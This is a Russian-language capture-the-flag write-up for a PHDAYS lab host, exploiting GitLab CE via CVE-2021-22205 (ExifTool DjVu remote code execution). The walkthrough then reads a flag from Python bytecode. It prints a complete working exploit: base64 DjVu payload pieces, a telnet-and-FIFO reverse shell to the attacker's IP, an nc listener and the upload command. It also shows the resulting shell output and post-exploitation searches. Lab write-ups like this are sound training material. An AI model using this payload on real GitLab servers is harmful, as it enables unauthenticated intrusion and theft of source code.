# Devportal — Кража исходного кода приложения (PHDAYS FEST Special)

**Сложность:** низкая  
**Хост:** `devportal.standalone.stf` / `10.124.249.12`  
**Суть:** GitLab CE уязвим к CVE-2021-22205 (RCE через ExifTool/DjVu). Через reverse shell забираем исходник EnterpriseConnect и UUID-флаг.

---

## 1. Разведка

```bash
curl -I http://10.124.249.12/
```

- Редирект на `/users/sign_in`
- Заголовки `X-Gitlab-Feature-Category`, `Server: nginx`
- Публичных проектов нет: `GET /api/v4/projects` → `[]`
- Help/UI → **GitLab Community Edition**

Цель — «украсть исходный код» EnterpriseConnect. Без учётки логичнее бить по известным RCE GitLab.

---

## 2. Уязвимость: CVE-2021-22205

Неаутентифицированный RCE в GitLab Workhorse:

1. Загрузка «картинки» на произвольный путь
2. Workhorse гоняет файл через **ExifTool**
3. В DjVu-аннотации — Perl-инъекция `qx{...}` → выполнениеда на сервере

Индикатор: upload с benign-файлом быстро даёт `422`, с эксплойтом — зависает (шёл/висит процесс) или `422` после выполнения команды.

---

## 3. Генерация payload

Reverse shell через `telnet` + FIFO (классика под CVE-2021-22205).  
`LHOST` — IP VPN (`tun0`), здесь `10.127.205.214`, порт `1270`.

```bash
LHOST=10.127.205.214
PORT=1270

echo -e "QVQmVEZPUk0AAAOvREpWTURJUk0AAAAugQACAAAARgAAAKz//96/mSAhyJFO6wwHH9LaiOhr5kQPLHEC7knTbpW9osMiP0ZPUk0AAABeREpWVUlORk8AAAAKAAgACBgAZAAWAElOQ0wAAAAPc2hhcmVkX2Fubm8uaWZmAEJHNDQAAAARAEoBAgAIAAiK5uGxN9l/KokAQkc0NAAAAAQBD/mfQkc0NAAAAAICCkZPUk0AAAMHREpWSUFOVGEAAAFQKG1ldGFkYXRhCgkoQ29weXJpZ2h0ICJcCiIgLiBxeHs=" \
  | base64 -d > lol.jpg

echo -n "TF=\$(mktemp -u);mkfifo \$TF && telnet ${LHOST} ${PORT} 0<\$TF | sh 1>\$TF" >> lol.jpg

echo -n "fSAuIFwKIiBiICIpICkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCg==" \
  | base64 -d >> lol.jpg
```

Проверка:

```bash
strings lol.jpg | grep qx
# qx{TF=$(mktemp -u);mkfifo $TF && telnet 10.127.205.214 1270 0<$TF | sh 1>$TF}
```

---

## 4. Listener + отправка

```bash
# Терминал 1
nc -lnvp 1270

# Терминал 2 — любой рандомный path
curl -v -F 'file=@lol.jpg' "http://10.124.249.12/$(openssl rand -hex 8)"
```

Ожидаемый шелл:

```text
Connection from 10.124.249.12
$ id
uid=995(git) gid=996(git) groups=996(git)
$ whoami
git
$ hostname
devportal.standalone.stf
$ pwd
/var/opt/gitlab/gitlab-workhorse
```

Если `curl` «висит» — часто RCE уже сработал, а callback не дошёл (не тот LHOST / listener / firewall). С VPN IP из `tun0` и открытым `1270` коннект стабильный.

---

## 5. Поиск исходников EnterpriseConnect

```bash
find / -iname '*EnterpriseConnect*' 2>/dev/null
```

Релевантное:

| Путь | Что это |
|------|---------|
| `/home/gitlab/EnterpriseConnect_v2.0.1_ReleaseNotes.txt` | Релиз-ноты |
| `/home/gitlab/__pycache__/EnterpriseConnect_v2.0.1.cpython-39.pyc` | **Актуальный** bytecode |
| `/var/opt/gitlab/gitlab-workhorse/EnterpriseConnect_v2.0.1.cpython-39.pyc` | Старая/кэш-копия |
| `/tmp/EnterpriseConnect_*.pyc` | Временные копии |

В bytecode есть отсылка к флагу задания:

```text
/root/flags/ue/source_code_flag.py
FLAG
```

(`/root` от `git` не читается — флаг лежит прямо в константах `.pyc`.)

---

## 6. Достаём флаг из `.pyc`

```bash
strings /home/gitlab/__pycache__/EnterpriseConnect_v2.0.1.cpython-39.pyc
```

Фрагмент marshal:

```text
Nz$1380070f-8689-4491-8d4c-5f12521d4387c
...
/root/flags/ue/source_code_flag.py
FLAGr
```

Разбор:

- `N` — `None`
- `z$` — ASCII-строка длиной 36 (`$` = 0x24)
- далее UUID = значение `FLAG`

### Флаг

```text
1380070f-8689-4491-8d4c-5f12521d4387
```

> На платформе флаг ротируется после сдачи другим участником. Смотреть нужно именно  
> `/home/gitlab/__pycache__/EnterpriseConnect_v2.0.1.cpython-39.pyc`,  
> а не копии в `workhorse`/`/tmp` (там может остаться старый UUID, напр. `3bbc9702-8ab2-4cde-a4ec-f57255ce4f9a`).


<img width="809" height="567" alt="image" src="https://github.com/user-attachments/assets/6594056e-b915-4325-9531-0a822333e6cb" />






Быстрый grep всех копий:

```bash
for f in \
  /home/gitlab/__pycache__/EnterpriseConnect_v2.0.1.cpython-39.pyc \
  /var/opt/gitlab/gitlab-workhorse/EnterpriseConnect_v2.0.1.cpython-39.pyc \
  /tmp/EnterpriseConnect_v2.0.1.cpython-39.pyc
do
  echo "== $f =="
  strings "$f" | grep -Eo '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
done
```

Актуальный = из `/home/gitlab/__pycache__/`.

---

## 7. Заметки / ложные следы

- **`/home/rceflag`** (SUID) печатает другой UUID (`31b5e45d-...`) — соседний RCE-чек, не «кража исходников».
- Публичный GitLab API пустой — репозиторий не нужен, исходник лежит на ФС рядом с GitLab.
- `nc`/`bash /dev/tcp` на цели могут отсутствовать; связка **telnet + mkfifo** из пейлоада работает.

---

## 8. Краткий чеклист

1. VPN up, узнать `tun0` IP  
2. Собрать DjVu `lol.jpg` с reverse shell на свой IP:`1270`  
3. `nc -lnvp 1270`  
4. `curl -F 'file=@lol.jpg' http://TARGET/$(openssl rand -hex 8)`  
5. `strings /home/gitlab/__pycache__/EnterpriseConnect_v2.0.1.cpython-39.pyc` → UUID рядом с `FLAG`  
6. Сдать флаг; при ротации — повторить шаг 5  

---

## Ссылки

- [CVE-2021-22205](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22205) — GitLab ExifTool RCE  
- Паттерн эксплойта: multipart upload на random path → Workhorse → ExifTool → `qx{}` в DjVu ANTa  

